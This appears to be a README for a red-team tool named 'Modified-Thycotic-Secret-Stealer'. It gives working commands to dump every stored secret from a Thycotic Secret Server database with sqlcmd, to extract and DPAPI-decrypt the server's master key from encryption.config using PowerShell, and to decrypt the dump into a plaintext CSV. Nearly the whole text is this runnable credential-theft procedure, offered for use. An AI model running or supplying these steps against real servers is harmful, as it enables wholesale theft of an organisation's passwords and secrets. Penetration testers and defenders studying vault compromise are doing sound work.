# Modified-Thycotic-Secret-Stealer for v10.8+ with DPAPI Integration

# SQLCMD
The following SQLCMD will pull all the items from the Database
```
sqlcmd -d SecretServer -q "select s.SecretName, f.SecretFieldName, s.[Key], i.ItemValue from tbSecretItem as i JOIN tbSecret as s ON (s.SecretID = i.SecretID) JOIN tbSecretField as f on (i.SecretFieldID = f.SecretFieldID)" -W -w 1024 -s "," -o Data.csv
```

# Pull Master Key off Thycotic Server

```
$masterKeys = Get-MasterKeysv104 -path C:\inetpub\wwwroot\SecretServer\encryption.config
$masterkeys.IsEncryptedWithDPAPI # should return true
$decrypted = [Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($masterkeys.key256), $null, 'LocalMachine')
[Text.Encoding]::ASCII.GetString($decrypted)
```

# Decrypt and Spit to CSV
```
Invoke-SecretDump -SecretServerDataPath <PATH TO .csv> -MasterKey <AES MASTER KEY>
```
Big thanks to curi0usJack and his original post here: https://www.trustedsec.com/blog/thycotic-secret-server-offline-decryption-methodology/


